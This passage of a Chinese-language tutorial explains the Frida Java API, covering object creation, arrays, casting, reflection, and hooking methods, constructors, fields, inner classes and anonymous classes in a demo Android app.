<p>加载类后，可以使用 <code>$new()</code> 来创建一个对象，例如创建一个 <code>String</code> 对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> jStringClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> jString = jStringClass.$new(<span class="string">&quot;字符串&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Java-array"><a href="#Java-array" class="headerlink" title="Java.array"></a>Java.array</h3><p>通过 <code>Java.array()</code> 可以在 Frida 中创建任意类型的数组。用法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;type&#x27;</span>,[value1,value2,value3])</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//标准写法：</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//标准写法：</span></span><br><span class="line">        <span class="keyword">let</span> myCharArr = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;char&quot;</span>,[<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">        <span class="keyword">let</span> myStringArr = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;Ljava.lang.String;&quot;</span>,[<span class="string">&quot;W&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;l&quot;</span>, <span class="string">&quot;d&quot;</span>]);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">ArrayClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.Arrays&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArrayClass</span>.<span class="title function_">toString</span>(myCharArr));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArrayClass</span>.<span class="title function_">toString</span>(myStringArr));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 偷懒写法</span></span><br><span class="line">        <span class="keyword">let</span> charArr = [<span class="string">&#x27;你&#x27;</span>,<span class="string">&#x27;好&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">        <span class="keyword">let</span> strArr = [<span class="string">&quot;你&quot;</span>,<span class="string">&quot;好&quot;</span>,<span class="string">&quot;!&quot;</span>]</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArrayClass</span>.<span class="title function_">toString</span>(charArr));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArrayClass</span>.<span class="title function_">toString</span>(strArr));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Java-cast"><a href="#Java-cast" class="headerlink" title="Java.cast"></a>Java.cast</h3><p>在 Frida 中使用 <code>Java.cast()</code> 来强转类型。例如我想获取某个对象的 <code>Class</code> ，那么就可以如下写：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> cls = <span class="title class_">Java</span>.<span class="title function_">cast</span>(obj.<span class="title function_">getClass</span>(),clazz); <span class="comment">//先获取obj的Class，然后再强转成Class类型。</span></span><br></pre></td></tr></table></figure>

<h3 id="Frida中数据类型定义"><a href="#Frida中数据类型定义" class="headerlink" title="Frida中数据类型定义"></a>Frida中数据类型定义</h3><p><strong>基本数据类型：</strong></p>
<table>
<thead>
<tr>
<th>Frida中的基本类型全名</th>
<th>Frida中的基本类型缩写(定义数组时使用)</th>
</tr>
</thead>
<tbody><tr>
<td>boolean</td>
<td>Z</td>
</tr>
<tr>
<td>byte</td>
<td>B</td>
</tr>
<tr>
<td>char</td>
<td>C</td>
</tr>
<tr>
<td>double</td>
<td>D</td>
</tr>
<tr>
<td>float</td>
<td>F</td>
</tr>
<tr>
<td>int</td>
<td>I</td>
</tr>
<tr>
<td>long</td>
<td>J</td>
</tr>
<tr>
<td>short</td>
<td>S</td>
</tr>
</tbody></table>
<p><strong>数组类型</strong></p>
<p>在 Frida 中用 <code>[</code> 表示数组，和 java 中的的表示方法一致。</p>
<p>例如是 <code>int</code> 类型的数组，写法为：<code>[I</code> ，如果是 <code>String</code> 类型的数组，则写法为:<code>[java.lang.String;</code> 。</p>
<h3 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h3><p>反射调用效率比较低，一般情况下不要使用。</p>
<p><strong>获取方法及使用。</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Constructor</span>  = jString.<span class="property">class</span>.<span class="title function_">getConstructor</span>([<span class="title class_">Type</span>.<span class="property">class</span>, <span class="title class_">Type</span>.<span class="property">class</span>...]);</span><br><span class="line"><span class="comment">// 设置访问属性</span></span><br><span class="line"><span class="title class_">Constructor</span>.<span class="title function_">setAccessible</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="comment">// 调用构造方法</span></span><br><span class="line"><span class="keyword">let</span> obj = <span class="title class_">Constructor</span>.<span class="title function_">newInstance</span>([<span class="title class_">Type</span>.<span class="property">obj</span>, <span class="title class_">Type</span>.<span class="property">obj</span>...]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取该类的所有公共方法(包含父类的)，得到的是一个数组</span></span><br><span class="line"><span class="keyword">let</span> methods = jString.<span class="property">class</span>.<span class="title function_">getMethods</span>();</span><br><span class="line"><span class="comment">//获取该类所有的私有方法(不包含父类)，得到的是一个数组</span></span><br><span class="line"><span class="keyword">let</span> methods = jString.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过名称获取该类的公共方法</span></span><br><span class="line"><span class="keyword">let</span> method = jString.<span class="property">class</span>.<span class="title function_">getMethod</span>(<span class="string">&quot;methodName&quot;</span>, [<span class="title class_">Type</span>.<span class="property">class</span>, <span class="title class_">Type</span>.<span class="property">class</span>...])</span><br><span class="line"><span class="comment">// 设置访问属性</span></span><br><span class="line">method.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 调用方法</span></span><br><span class="line">method.<span class="title function_">invoke</span>(obj, [<span class="title class_">Type</span>.<span class="property">obj</span>, <span class="title class_">Type</span>.<span class="property">obj</span>...]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过名称获取该类的私有方法</span></span><br><span class="line"><span class="keyword">let</span> method = jString.<span class="property">class</span>.<span class="title function_">getDeclaredMethod</span>(<span class="string">&quot;methodName&quot;</span>, [<span class="title class_">Type</span>.<span class="property">class</span>, <span class="title class_">Type</span>.<span class="property">class</span>...])</span><br><span class="line"><span class="comment">// 设置访问属性</span></span><br><span class="line">method.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 调用方法</span></span><br><span class="line">method.<span class="title function_">invoke</span>(obj, [<span class="title class_">Type</span>.<span class="property">obj</span>, <span class="title class_">Type</span>.<span class="property">obj</span>...]);</span><br></pre></td></tr></table></figure>

<p><strong>获取属性值和设置属性值。</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> jString = <span class="title class_">Java</span>.<span class="title function_">use</span>(className);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取该类的所有公共属性(包含父类的)，得到的是一个数组</span></span><br><span class="line"><span class="keyword">let</span> fields = jString.<span class="property">class</span>.<span class="title function_">getFields</span>();</span><br><span class="line"><span class="comment">//获取该类所有的私有属性(不包含父类)，得到的是一个数组</span></span><br><span class="line"><span class="keyword">let</span> fields = jString.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过名称获取该类的公共属性</span></span><br><span class="line"><span class="keyword">let</span> field = jString.<span class="property">class</span>.<span class="title function_">getField</span>(fieldName)</span><br><span class="line"></span><br><span class="line">field.<span class="title function_">setAccessible</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">let</span> field = nameField.<span class="title function_">get</span>(obj);</span><br><span class="line">field.<span class="title function_">set</span>(user, value);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//通过名称获取该类的私有属性</span></span><br><span class="line"><span class="keyword">let</span> field = jString.<span class="property">class</span>.<span class="title function_">getDeclaredField</span>(fieldName)</span><br><span class="line">field.<span class="title function_">setAccessible</span>(<span class="literal">true</span>)</span><br><span class="line"><span class="keyword">let</span> field = nameField.<span class="title function_">get</span>(obj);</span><br><span class="line">field.<span class="title function_">set</span>(user, value);</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="comment">// 实例化对象</span></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Dog</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.Dog&quot;</span>);</span><br><span class="line">        <span class="comment">// 反射获取所有的方法</span></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Methods</span> = <span class="title class_">Dog</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------------------------------------------&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> method <span class="keyword">of</span> <span class="title class_">Methods</span>)</span><br><span class="line">           <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Dog DeclaredMethods: &quot;</span> +</span><br><span class="line">                    <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(method.<span class="title function_">toString</span>()));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------------------------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">String</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Integer</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Integer&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取 int.class , 目前只找到这种方法，后续如果有更好的方法再进行更新</span></span><br><span class="line">        <span class="keyword">let</span> int = <span class="title class_">Integer</span>.<span class="property">class</span>.<span class="title function_">getField</span>(<span class="string">&quot;TYPE&quot;</span>).<span class="title function_">get</span>(<span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Constructor</span> = <span class="title class_">Dog</span>.<span class="property">class</span>.<span class="title function_">getConstructor</span>([<span class="title class_">String</span>.<span class="property">class</span>, int]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title class_">Constructor</span>));</span><br><span class="line">        <span class="keyword">let</span> dog = <span class="title class_">Constructor</span>.<span class="title function_">newInstance</span>([<span class="title class_">String</span>.$new(<span class="string">&quot;小白&quot;</span>), <span class="title class_">Integer</span>.$new(<span class="number">2</span>)]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射调用 sleep 方法</span></span><br><span class="line">        <span class="keyword">let</span> sleep = <span class="title class_">Dog</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethod</span>(<span class="string">&quot;sleep&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        sleep.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        sleep.<span class="title function_">invoke</span>(dog, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> _sleep = <span class="title class_">Dog</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethod</span>(<span class="string">&quot;sleep&quot;</span>, [<span class="title class_">String</span>.<span class="property">class</span>]);</span><br><span class="line">        _sleep.<span class="title function_">invoke</span>(dog, [<span class="title class_">String</span>.$new(<span class="string">&quot;狗窝&quot;</span>)]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取字段</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;============================================&quot;</span>)</span><br><span class="line">        <span class="keyword">let</span> fields = <span class="title class_">Dog</span>.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> field <span class="keyword">of</span> fields)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Filed: &quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(field.<span class="title function_">toString</span>()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;============================================&quot;</span>)</span><br><span class="line">        <span class="comment">// 静态字段</span></span><br><span class="line">        <span class="keyword">let</span> reflect_TAG = <span class="title class_">Dog</span>.<span class="property">class</span>.<span class="title function_">getDeclaredField</span>(<span class="string">&quot;TAG&quot;</span>);</span><br><span class="line">        reflect_TAG.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TAG: &quot;</span> + reflect_TAG.<span class="title function_">get</span>(<span class="literal">null</span>))</span><br><span class="line">        reflect_TAG.<span class="title function_">set</span>(<span class="literal">null</span>, <span class="string">&quot;HOOK OK&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;TAG: &quot;</span> + reflect_TAG.<span class="title function_">get</span>(<span class="literal">null</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 普通字段</span></span><br><span class="line">        <span class="keyword">let</span> reflect_name = <span class="title class_">Dog</span>.<span class="property">class</span>.<span class="title function_">getField</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        reflect_name.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Animal</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.Animal&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;name: &quot;</span> + reflect_name.<span class="title function_">get</span>(dog))</span><br><span class="line">        reflect_name.<span class="title function_">set</span>(dog, <span class="string">&quot;小黑&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;name: &quot;</span> + reflect_name.<span class="title function_">get</span>(dog))</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="comment">// 实例化对象</span></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Dog</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.Dog&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> dog = <span class="title class_">Dog</span>.$new(<span class="string">&quot;小白&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;实例化对象&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(dog));</span><br><span class="line">        dog.<span class="title function_">eat</span>(<span class="string">&quot;狗粮&quot;</span>);</span><br><span class="line">        dog.<span class="title function_">sleep</span>();</span><br><span class="line">        dog.<span class="title function_">sleep</span>(<span class="string">&quot;狗窝&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h2 id="Hook-操作"><a href="#Hook-操作" class="headerlink" title="Hook 操作"></a>Hook 操作</h2><h3 id="hook-普通方法"><a href="#hook-普通方法" class="headerlink" title="hook 普通方法"></a>hook 普通方法</h3><p>直接使用 <code>类.方法名.implementation =function()&#123;&#125;</code> 来对一个方法进行 Hook 。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.MainActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// hook 普通方法</span></span><br><span class="line">        <span class="title class_">MainActivity</span>.<span class="property">add</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a:number, b:number</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`add params a: <span class="subst">$&#123;a&#125;</span>, b: <span class="subst">$&#123;b&#125;</span>`</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`add params arguments[0]: <span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">0</span>]&#125;</span>, arguments[1]: <span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">1</span>]&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改返回值</span></span><br><span class="line">            <span class="keyword">return</span> a * <span class="number">2</span> + b * <span class="number">2</span>; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Hook-重载方法"><a href="#Hook-重载方法" class="headerlink" title="Hook 重载方法"></a>Hook 重载方法</h3><p>使用 <code>类.方法名.overload(参数).implementation =function()&#123;&#125;</code> 进行 Hook ，其中参数为重载的类型。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Dog</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.Dog&quot;</span>);</span><br><span class="line">        <span class="comment">// Hook 重载方法</span></span><br><span class="line">        <span class="title class_">Dog</span>.<span class="property">sleep</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook 重载方法 sleep .&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Dog</span>.<span class="property">sleep</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">str:string</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook 重载方法 sleep(String) &quot;</span> + str)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Hook-构造方法"><a href="#Hook-构造方法" class="headerlink" title="Hook 构造方法"></a>Hook 构造方法</h3><p>如果没有重载，直接使用 <code>类.$init.implementation =function()&#123;&#125;</code> 进行 Hook 。</p>
<p>如果存在重载，则使用 <code>类.$init.overload(参数).implementation =function()&#123;&#125;</code> 进行 Hook 。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Dog</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.Dog&quot;</span>);</span><br><span class="line">        <span class="comment">// Hook 构造方法</span></span><br><span class="line">        <span class="title class_">Dog</span>.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">name:string, age:number</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook Dog 构造函数，原始参数为 name : &quot;</span></span><br><span class="line">                + name + <span class="string">&quot;; age: &quot;</span> + age);</span><br><span class="line">            <span class="comment">// 修改参数</span></span><br><span class="line">            <span class="variable language_">this</span>.$init(<span class="string">&quot;土狗&quot;</span>, <span class="number">10</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook Dog 构造函数，修改参数为 name : &quot;</span></span><br><span class="line">                + <span class="variable language_">this</span>.<span class="property">name</span>.<span class="property">value</span> + <span class="string">&quot;; age: &quot;</span> + <span class="variable language_">this</span>.<span class="property">age</span>.<span class="property">value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Hook-成员变量"><a href="#Hook-成员变量" class="headerlink" title="Hook 成员变量"></a>Hook 成员变量</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.MainActivity&quot;</span>);</span><br><span class="line">        <span class="comment">// Hook 静态成员，直接通过类获取静态成员变量</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable constant_">TAG</span> = <span class="title class_">MainActivity</span>.<span class="property">TAG</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;static value TAG:&quot;</span> + <span class="variable constant_">TAG</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="comment">// 修改静态成员</span></span><br><span class="line">        <span class="variable constant_">TAG</span>.<span class="property">value</span> = <span class="string">&quot;HOOK OK&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hook 普通成员</span></span><br><span class="line">        <span class="title class_">MainActivity</span>.<span class="property">onCreate</span>.<span class="title function_">overload</span>(<span class="string">&quot;android.os.Bundle&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">bundle:<span class="built_in">Object</span></span>)&#123;</span><br><span class="line">            <span class="comment">// 普通成员变量只能通过实例对象获取</span></span><br><span class="line">            <span class="comment">// 当对象的成员变量和成员方法名重复时,成员属性前加 `_` 进行区分</span></span><br><span class="line">            <span class="keyword">let</span> add = <span class="variable language_">this</span>.<span class="property">_add</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;add value : &quot;</span> + add.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;static value TAG:&quot;</span> + <span class="variable constant_">TAG</span>.<span class="property">value</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">onCreate</span>(bundle);</span><br><span class="line">            add.<span class="property">value</span> = <span class="number">11</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Hook-内部类"><a href="#Hook-内部类" class="headerlink" title="Hook 内部类"></a>Hook 内部类</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="comment">// Hook 内部类</span></span><br><span class="line">        <span class="keyword">let</span> innerClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.MainActivity$innerClass&quot;</span>);</span><br><span class="line">        innerClass.<span class="property">setNum</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">num:number</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;innerClass setNum num value: &quot;</span> + num)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 修改 num</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">setNum</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

<h3 id="Hook-匿名类"><a href="#Hook-匿名类" class="headerlink" title="Hook 匿名类"></a>Hook 匿名类</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Frida Hook Start.&#x27;</span>);</span><br><span class="line">        <span class="comment">// Hook 内部类</span></span><br><span class="line">        <span class="keyword">let</span> cat = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.MainActivity$1$1&quot;</span>);</span><br><span class="line">        cat.<span class="property">eat</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">food:string</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="title function_">getName</span>() + <span class="string">&quot; eat &quot;</span> + food)</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">eat</span>(<span class="string">&quot;鱼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> callback = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.android.MainActivity$1$2&quot;</span>);</span><br><span class="line">        callback.<span class="property">finsh</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">msg:string</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;callback finsh: &quot;</span> + msg)</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">finsh</span>(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure>

